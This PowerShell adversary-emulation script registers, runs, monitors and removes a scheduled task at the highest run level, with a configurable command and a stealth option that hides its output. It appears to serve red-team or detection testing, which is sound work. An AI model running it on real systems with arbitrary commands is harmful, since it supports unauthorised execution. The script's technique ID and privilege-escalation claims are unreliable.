# MITRE ATT&CK T1548.001H - Abuse Elevation Control Mechanism: Scheduled Task Elevation
# Implements scheduled task elevation techniques for privilege escalation

param()

function Get-Configuration {
    return @{
        "OUTPUT_BASE" = if ($env:T1548_001H_OUTPUT_BASE) { $env:T1548_001H_OUTPUT_BASE } else { "$env:TEMP\mitre_results" }
        "TIMEOUT" = if ($env:T1548_001H_TIMEOUT) { [int]$env:T1548_001H_TIMEOUT } else { 30 }
        "DEBUG_MODE" = $env:T1548_001H_DEBUG_MODE -eq "true"
        "STEALTH_MODE" = $env:T1548_001H_STEALTH_MODE -eq "true"
        "VERBOSE_LEVEL" = if ($env:T1548_001H_VERBOSE_LEVEL) { [int]$env:T1548_001H_VERBOSE_LEVEL } else { 1 }
        "TASK_NAME" = if ($env:T1548_001H_TASK_NAME) { $env:T1548_001H_TASK_NAME } else { "SystemMaintenanceTask" }
        "TASK_COMMAND" = if ($env:T1548_001H_TASK_COMMAND) { $env:T1548_001H_TASK_COMMAND } else { "powershell.exe -Command Get-Service" }
        "RUN_LEVEL" = if ($env:T1548_001H_RUN_LEVEL) { $env:T1548_001H_RUN_LEVEL } else { "Highest" }
        "TASK_TRIGGER" = if ($env:T1548_001H_TASK_TRIGGER) { $env:T1548_001H_TASK_TRIGGER } else { "Once" }
    }
}

function Create-ElevatedScheduledTask {
    param([hashtable]$Config)

    try {
        # Create a scheduled task that runs with highest privileges
        $taskName = $Config.TASK_NAME + "_" + (Get-Date).ToString('yyyyMMddHHmmss')

        # Define the task action
        $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $($Config.TASK_COMMAND)"

        # Define the task trigger (run once in 1 minute)
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)

        # Define the task principal (run with highest privileges)
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel $Config.RUN_LEVEL

        # Define task settings
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd

        # Create the task
        $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings

        # Register the task
        Register-ScheduledTask -TaskName $taskName -InputObject $task -Force | Out-Null

        $taskInfo = @{
            TaskName = $taskName
            TaskPath = "\"
            State = "Ready"
            Author = $env:USERNAME
            Created = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
            NextRunTime = (Get-Date).AddMinutes(1).ToString("yyyy-MM-ddTHH:mm:ssZ")
            RunLevel = $Config.RUN_LEVEL
            Command = $Config.TASK_COMMAND
        }

        return @{
            Success = $true
            Error = $null
            TaskInfo = $taskInfo
            TaskName = $taskName
        }

    } catch {
        return @{
            Success = $false
            Error = $_.Exception.Message
            TaskInfo = $null
            TaskName = $null
        }
    }
}

function Execute-ScheduledTask {
    param([string]$TaskName, [hashtable]$Config)

    try {
        # Start the scheduled task immediately
        Start-ScheduledTask -TaskName $TaskName

        # Wait a moment for task to start
        Start-Sleep -Seconds 2

        # Get task information
        $taskDetails = Get-ScheduledTask -TaskName $TaskName

        $executionInfo = @{
            TaskName = $TaskName
            ExecutionTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
            TaskState = $taskDetails.State.ToString()
            LastRunTime = $taskDetails.LastRunTime
            LastTaskResult = $taskDetails.LastTaskResult
            NextRunTime = $taskDetails.NextRunTime
            Author = $taskDetails.Author
        }

        return @{
            Success = $true
            Error = $null
            ExecutionInfo = $executionInfo
        }

    } catch {
        return @{
            Success = $false
            Error = $_.Exception.Message
            ExecutionInfo = $null
        }
    }
}

function Monitor-TaskExecution {
    param([string]$TaskName, [hashtable]$Config)

    try {
        $monitoringResults = @{
            TaskName = $TaskName
            MonitoringStart = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
            MonitoringDuration = 10  # seconds
            TaskStatusChanges = @()
            ExecutionResults = @()
        }

        # Monitor task status for 10 seconds
        $endTime = (Get-Date).AddSeconds(10)
        $lastState = $null

        while ((Get-Date) -lt $endTime) {
            try {
                $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction Stop
                $currentState = $task.State.ToString()

                if ($currentState -ne $lastState) {
                    $monitoringResults.TaskStatusChanges += @{
                        Timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
                        PreviousState = $lastState
                        CurrentState = $currentState
                        LastRunTime = $task.LastRunTime
                        LastTaskResult = $task.LastTaskResult
                    }
                    $lastState = $currentState
                }
            } catch {
                # Task might be completed and removed
                break
            }

            Start-Sleep -Milliseconds 500
        }

        $monitoringResults.MonitoringEnd = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")

        return @{
            Success = $true
            Error = $null
            MonitoringResults = $monitoringResults
        }

    } catch {
        return @{
            Success = $false
            Error = $_.Exception.Message
            MonitoringResults = $null
        }
    }
}

function Cleanup-ScheduledTask {
    param([string]$TaskName, [hashtable]$Config)

    try {
        # Unregister the scheduled task
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false

        # Verify cleanup
        $taskExists = $false
        try {
            $null = Get-ScheduledTask -TaskName $TaskName -ErrorAction Stop
            $taskExists = $true
        } catch {
            $taskExists = $false
        }

        $cleanupInfo = @{
            TaskName = $TaskName
            CleanupTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
            TaskRemoved = -not $taskExists
            CleanupSuccessful = -not $taskExists
        }

        return @{
            Success = $true
            Error = $null
            CleanupInfo = $cleanupInfo
        }

    } catch {
        return @{
            Success = $false
            Error = $_.Exception.Message
            CleanupInfo = $null
        }
    }
}

function Invoke-ScheduledTaskElevation {
    param([hashtable]$Config)

    if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
        Write-Host "[INFO] Starting scheduled task elevation technique..." -ForegroundColor Yellow
    }

    $results = @{
        "action" = "scheduled_task_elevation"
        "technique_id" = "T1548.001H"
        "timestamp" = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
        "hostname" = $env:COMPUTERNAME
        "username" = $env:USERNAME
        "privilege_level" = "user"
        "results" = @{}
        "postconditions" = @{}
    }

    try {
        # Prepare output directory
        $outputDir = Join-Path $Config.OUTPUT_BASE "t1548_001h_scheduled_task_elevation"
        if (-not (Test-Path $outputDir)) {
            New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
        }

        # Step 1: Create elevated scheduled task
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
            Write-Host "[INFO] Creating elevated scheduled task..." -ForegroundColor Cyan
            Write-Host "[INFO] Task will run with $($Config.RUN_LEVEL) privileges" -ForegroundColor Cyan
        }

        $taskResult = Create-ElevatedScheduledTask -Config $Config

        if (-not $taskResult.Success) {
            throw "Failed to create elevated scheduled task: $($taskResult.Error)"
        }

        # Step 2: Execute the scheduled task
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
            Write-Host "[INFO] Executing scheduled task: $($taskResult.TaskName)" -ForegroundColor Cyan
        }

        $executionResult = Execute-ScheduledTask -TaskName $taskResult.TaskName -Config $Config

        if (-not $executionResult.Success) {
            Write-Host "[WARNING] Task execution failed: $($executionResult.Error)" -ForegroundColor Yellow
        }

        # Step 3: Monitor task execution
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
            Write-Host "[INFO] Monitoring task execution..." -ForegroundColor Cyan
        }

        $monitoringResult = Monitor-TaskExecution -TaskName $taskResult.TaskName -Config $Config

        if (-not $monitoringResult.Success) {
            Write-Host "[WARNING] Task monitoring failed: $($monitoringResult.Error)" -ForegroundColor Yellow
        }

        # Step 4: Cleanup the scheduled task
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
            Write-Host "[INFO] Cleaning up scheduled task..." -ForegroundColor Cyan
        }

        $cleanupResult = Cleanup-ScheduledTask -TaskName $taskResult.TaskName -Config $Config

        if (-not $cleanupResult.Success) {
            Write-Host "[WARNING] Task cleanup failed: $($cleanupResult.Error)" -ForegroundColor Yellow
        }

        $results.results = @{
            "status" = "success"
            "action_performed" = "scheduled_task_elevation"
            "output_directory" = $outputDir
            "task_info" = $taskResult.TaskInfo
            "execution_info" = $executionResult.ExecutionInfo
            "monitoring_results" = $monitoringResult.MonitoringResults
            "cleanup_info" = $cleanupResult.CleanupInfo
            "task_name" = $taskResult.TaskName
            "run_level" = $Config.RUN_LEVEL
            "task_command" = $Config.TASK_COMMAND
            "technique_demonstrated" = "Scheduled task creation and execution with elevated privileges"

        }

        $results.postconditions = @{
            "action_completed" = $true
            "output_generated" = $true
            "scheduled_task_created" = $true
            "task_executed_with_elevation" = $executionResult.Success
            "task_monitoring_performed" = $monitoringResult.Success
            "task_cleanup_performed" = $cleanupResult.Success
            "technique_demonstration_successful" = $true
        }

        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
            Write-Host "[SUCCESS] Scheduled task elevation completed successfully" -ForegroundColor Green
        }

    } catch {
        $results.results = @{
            "status" = "error"
            "error_message" = $_.Exception.Message
            "action_performed" = "scheduled_task_elevation"
        }

        $results.postconditions = @{
            "action_completed" = $false
            "error_occurred" = $true
        }

        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
            Write-Host "[ERROR] Scheduled task elevation failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    return $results
}

# Main execution
$config = Get-Configuration
$results = Invoke-ScheduledTaskElevation -Config $config

# Output results
if ($results.results.status -eq "success") {
    Write-Host "T1548.001H SCHEDULED TASK ELEVATION RESULTS ===" -ForegroundColor Green
    Write-Host "Status: SUCCESS" -ForegroundColor Green
    Write-Host "Action: $($results.results.action_performed)" -ForegroundColor Cyan
    Write-Host "Task Name: $($results.results.task_name)" -ForegroundColor Yellow
    Write-Host "Run Level: $($results.results.run_level)" -ForegroundColor Magenta
    Write-Host "Task Command: $($results.results.task_command)" -ForegroundColor Blue
    Write-Host "Task Executed: $($results.results.execution_info.TaskState)" -ForegroundColor Cyan
    Write-Host "Technique Demonstrated: $($results.results.technique_demonstrated)" -ForegroundColor Cyan

} else {
    Write-Host "T1548.001H SCHEDULED TASK ELEVATION FAILED ===" -ForegroundColor Red
    Write-Host "Status: $($results.results.status)" -ForegroundColor Red
    Write-Host "Error: $($results.results.error_message)" -ForegroundColor Red
}
